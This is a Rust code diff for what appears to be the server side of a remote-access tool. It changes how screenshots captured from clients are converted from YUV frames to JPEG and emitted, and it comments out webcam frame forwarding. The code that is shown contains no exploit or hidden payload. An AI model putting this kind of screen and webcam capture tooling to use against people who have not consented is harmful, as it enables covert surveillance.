@@ -12,9 +12,10 @@ use rsa::{RsaPrivateKey, RsaPublicKey};
 use rsa::pkcs8::EncodePublicKey;
 use rsa::rand_core::OsRng;
 use base64::{engine::general_purpose, Engine as _};
+use std::io::Cursor;
 
 use common::packets::*;
-
+use image::{ImageBuffer, RgbImage, ImageOutputFormat};
 use anyhow::{Context, Result};
 use crate::commands::*;
 use common::RSA_BITS;
@@ -81,16 +82,80 @@ impl ServerWrapper {
     }
 
     // Helper method to create and send image data
-    async fn send_image_data(&self, addr: &SocketAddr, event: &str, data: &[u8]) {
-        let base64_img = general_purpose::STANDARD.encode(data);
-        let data_url = format!("data:image/jpeg;base64,{}", base64_img);
-
-        let payload = serde_json::json!({
-            "addr": addr.to_string(),
-            "data": data_url
-        });
-
-        self.emit_serde_payload(event, payload).await;
+    async fn send_image_data(
+        &self,
+        addr: &SocketAddr,
+        event: &str,
+        data: &[u8],
+        width: usize,
+        height: usize,
+    ) {
+        // Ensure width and height are even (YUV420 requirement)
+        let width = width - (width % 2);
+        let height = height - (height % 2);
+        
+        // Early check for zero dimensions
+        if width == 0 || height == 0 {
+            eprintln!("❌ Invalid image dimensions: {}x{}", width, height);
+            return;
+        }
+        
+        // Calculate expected YUV buffer sizes
+        let y_size = width * height;
+        let uv_size = y_size / 4;
+        
+        // Check data size
+        if data.len() < y_size + 2 * uv_size {
+            eprintln!("❌ Data too small for I420 format: {} < {}", data.len(), y_size + 2 * uv_size);
+            return;
+        }
+        
+        // Extract YUV planes directly from data
+        let y = &data[..y_size];
+        let u = &data[y_size..y_size + uv_size];
+        let v = &data[y_size + uv_size..y_size + uv_size + uv_size];
+    
+        // Create RGB buffer with proper size
+        let rgb_size = width * height * 3;
+        let mut rgb_data = vec![0u8; rgb_size];
+        
+        // Convert YUV to RGB directly
+        common::convert::i420_to_rgb(width, height, y, u, v, &mut rgb_data, width, height);
+    
+        // JPEG quality based on data size - smaller images can use higher quality
+        let jpeg_quality = if width * height > 1920 * 1080 {
+            65 // HD or larger - use lower quality
+        } else if width * height > 1280 * 720 {
+            75 // Between HD and FHD - medium quality
+        } else {
+            85 // Small resolution - higher quality
+        };
+    
+        // Create image from RGB data
+        let img_result = RgbImage::from_raw(width as u32, height as u32, rgb_data);
+        
+        if let Some(img) = img_result {
+            // Pre-allocate buffer with estimated size to avoid reallocations
+            let mut jpeg_bytes = Cursor::new(Vec::with_capacity(width * height / 4));
+            
+            if let Err(e) = img.write_to(&mut jpeg_bytes, ImageOutputFormat::Jpeg(jpeg_quality)) {
+                eprintln!("❌ JPEG encoding failed: {e}");
+                return;
+            }
+        
+            let jpeg_data = jpeg_bytes.into_inner();
+            let base64_img = general_purpose::STANDARD.encode(jpeg_data);
+            let data_url = format!("data:image/jpeg;base64,{}", base64_img);
+        
+            let payload = serde_json::json!({
+                "addr": addr.to_string(),
+                "data": data_url
+            });
+        
+            self.emit_serde_payload(event, payload).await;
+        } else {
+            eprintln!("❌ Failed to create image buffer from RGB data.");
+        }
     }
 
     // Helper method for handling client data responses
@@ -414,8 +479,15 @@ impl ServerWrapper {
                                 ),
                             )
                             .await;
-                        self.send_image_data(&addr, "client_screenshot", &data)
-                            .await;
+                
+                        self.send_image_data(
+                            &addr,
+                            "client_screenshot",
+                            &data.data,
+                            data.width as usize,
+                            data.height as usize,
+                        )
+                        .await;
                     }
                 }
 
@@ -459,10 +531,10 @@ impl ServerWrapper {
                 }
 
                 WebcamResult(addr, frame) => {
-                    if let Ok(jpeg_data) = crate::utils::webcam::process_webcam_frame(frame) {
-                        self.send_image_data(&addr, "webcam_result", &jpeg_data)
-                            .await;
-                    }
+                    // if let Ok(jpeg_data) = crate::utils::webcam::process_webcam_frame(frame) {
+                    //     self.send_image_data(&addr, "webcam_result", &jpeg_data)
+                    //         .await;
+                    // }
                 }
 
                 FileList(addr, files) => {
